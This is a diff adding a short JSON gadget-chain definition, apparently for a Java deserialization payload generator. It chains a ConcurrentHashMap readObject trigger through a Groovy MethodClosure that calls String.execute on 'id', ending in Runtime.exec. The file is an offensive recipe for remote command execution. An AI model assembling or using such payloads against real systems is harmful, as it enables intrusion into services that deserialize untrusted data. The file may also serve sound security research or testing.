@@ -1,0 +1,18 @@
+{
+    "chain_type": "fragment: Groovy MethodClosure → String.execute() → Runtime.exec",
+    "root_class": "java.util.concurrent.ConcurrentHashMap",
+    "root_trigger": "readObject→putVal→hashCode",
+    "links": [
+        {
+            "class": "org.codehaus.groovy.runtime.MethodClosure",
+            "field_overrides": {
+                "owner": "id",
+                "delegate": "id",
+                "method": "execute",
+                "maximumNumberOfParameters": 0,
+                "parameterTypes": []
+            }
+        }
+    ],
+    "sink_method": "Runtime.exec"
+}
